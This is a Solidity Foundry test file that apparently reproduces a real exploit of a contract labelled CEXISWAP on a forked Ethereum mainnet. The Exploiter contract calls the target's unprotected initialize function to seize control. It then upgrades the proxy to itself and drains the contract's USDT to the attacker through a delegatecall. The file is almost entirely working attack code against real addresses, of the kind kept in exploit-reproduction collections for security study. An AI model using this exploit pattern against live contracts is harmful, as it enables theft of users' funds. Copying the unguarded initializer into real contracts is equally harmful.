// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

contract CexiTest is Test {
    ICEXISWAP private constant CEXISWAP =
        ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);
    IUSDT private constant USDT =
        IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    Exploiter private exploiter;

    function setUp() public {
        vm.createSelectFork("mainnet", 18182605);
        vm.label(address(CEXISWAP), "CEXISWAP");
        vm.label(address(USDT), "USDT");
    }

    function testExploit() public {
        exploiter = new Exploiter();
        exploiter.exploit();
        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit",
            USDT.balanceOf(address(this)),
            6
        );
    }
}

contract Exploiter {
    ICEXISWAP private constant CEXISWAP =
        ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);
    IUSDT private constant USDT =
        IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    bytes32 private constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address private immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function exploit() external {
        CEXISWAP.initialize(
            "HAX",
            "HAX",
            address(this),
            address(this),
            address(this),
            address(this)
        );
        CEXISWAP.upgradeToAndCall(
            address(this),
            abi.encodePacked(this.exploit2.selector)
        );
    }

    // function 0x1de24bbf
    function exploit2() external {
        // delegatecall
        USDT.transfer(owner, USDT.balanceOf(address(this)));
    }

    function upgradeTo(address newImplementation) external {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImplementation)
        }
    }
}
